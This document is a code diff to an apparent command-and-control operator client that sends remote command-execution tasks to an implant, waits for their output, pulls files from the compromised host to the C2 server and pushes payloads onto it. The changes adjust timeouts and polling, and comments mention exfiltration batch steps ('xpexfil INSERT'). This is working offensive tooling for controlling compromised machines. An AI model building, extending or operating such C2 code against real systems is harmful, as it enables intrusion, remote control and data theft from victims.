@@ -28,7 +28,11 @@ class C2Client:
         self.hostname   = None
         self._task_num  = random.randint(1000, 60000)
         self.debug      = debug
-        self._timeout_s = 120
+        # Single operator-facing timeout knob (set via `timeout <n>` in the
+        # shell): the implant wait-limit sent in every EXEC task JSON.
+        # Batch pipelines routinely run minutes (stage INSERT, hex decode,
+        # xpexfil INSERT), so the default is 600, not 120.
+        self._timeout_s = 600
 
     # -- transport -----------------------------------------------------------
 
@@ -57,10 +61,16 @@ class C2Client:
         resp = requests.post(url, body)
         return self._extract(resp, RESP_TYPE_TASK_INFO)
 
-    def _poll_output(self, task_guid: str, timeout_s: int = 120) -> str | None:
+    def _poll_output(self, task_guid: str, timeout_s: int | None = None) -> str | None:
+        """Poll a task until it reaches a terminal state (FINISHED / DISCARDED).
+
+        No deadline by default: a task always terminates - success registers
+        output (TASK_COMPLETE), failure registers "TASK ERROR ..." (server marks
+        errored tasks finished). Pass timeout_s explicitly only when the caller
+        wants fire-and-forget semantics (keep watching, task keeps running)."""
         url      = f"{self.base_url}/task/{task_guid}"
-        deadline = datetime.now() + timedelta(seconds=timeout_s)
-        while datetime.now() < deadline:
+        deadline = datetime.now() + timedelta(seconds=timeout_s) if timeout_s else None
+        while deadline is None or datetime.now() < deadline:
             resp = requests.get(url)
             try:
                 data   = self._extract(resp, RESP_TYPE_TASK_INFO)
@@ -118,24 +128,26 @@ class C2Client:
         info     = self._post_task(task)
         task_guid = info[TASK_GUID_KEY]
         print(f"[*] task {task_guid} queued (taskNum={task_num}), waiting ...")
+        # Block until the task reaches a terminal state - the implant wait-limit
+        # above is the only deadline; the task ends with output or TASK ERROR.
         output = self._poll_output(task_guid)
         if output is not None:
             print(output, end="" if output.endswith("\n") else "\n")
 
     def cmd_exec_raw(self, command: str, timeout_s: int = None) -> str:
-        """Send EXEC task, block on poll, return raw output string (no print)."""
-        if timeout_s is None:
-            timeout_s = self._timeout_s
+        """Send EXEC task, block until terminal state, return raw output string.
+
+        timeout_s (optional) only raises the implant wait-limit for this task
+        (task JSON = max(self._timeout_s, timeout_s)); the poll itself has no
+        deadline."""
+        effective_wait = max(self._timeout_s, timeout_s or 0)
         if self.debug:
-            print(f"[DBG] EXEC  -> {command}")
+            print(f"[DBG] EXEC  -> {command} (wait-limit {effective_wait}s)")
         task_num = self._next_task_num()
-        # implant-side timeout = the larger of the operator default and this
-        # call's poll timeout, so the wait limit never kills a batch the poll
-        # is still waiting on.
         task     = {"id": TS_EXEC, "taskNum": task_num, "args": command,
-                    "timeout": max(self._timeout_s, timeout_s)}
+                    "timeout": effective_wait}
         info     = self._post_task(task)
-        output   = self._poll_output(info[TASK_GUID_KEY], timeout_s=timeout_s)
+        output   = self._poll_output(info[TASK_GUID_KEY])
         if self.debug and output:
             out_preview = output.strip()[:300] + ('...' if len(output.strip()) > 300 else '')
             print(f"[DBG] OUT   <- {out_preview}")
@@ -150,7 +162,7 @@ class C2Client:
         info     = self._post_task(task)
         print(f"[*] file-get task {info[TASK_GUID_KEY]} queued (implant will push {remote_path})")
 
-    def cmd_get_wait(self, remote_path: str, dest_name: str = None, timeout_s: int = 180):
+    def cmd_get_wait(self, remote_path: str, dest_name: str = None, timeout_s: int = None):
         """Pull a file FROM the implant to the C2 server upload dir, block until complete."""
         if self.debug:
             print(f"[DBG] GET-W -> implant:{remote_path} -> C2 files/{dest_name or '(random)'}  (blocking)")
@@ -169,7 +181,7 @@ class C2Client:
             label = dest_name or remote_path.rsplit("\\", 1)[-1]
             print(f"[+] file-get complete: C2 files/{label}")
 
-    def cmd_put_wait(self, payload_name: str, remote_dest: str, timeout_s: int = 180):
+    def cmd_put_wait(self, payload_name: str, remote_dest: str, timeout_s: int = None):
         """Push a file to the implant and block until transfer is complete."""
         if self.debug:
             print(f"[DBG] PUT-W -> payloads/{payload_name} -> implant:{remote_dest}  (blocking)")
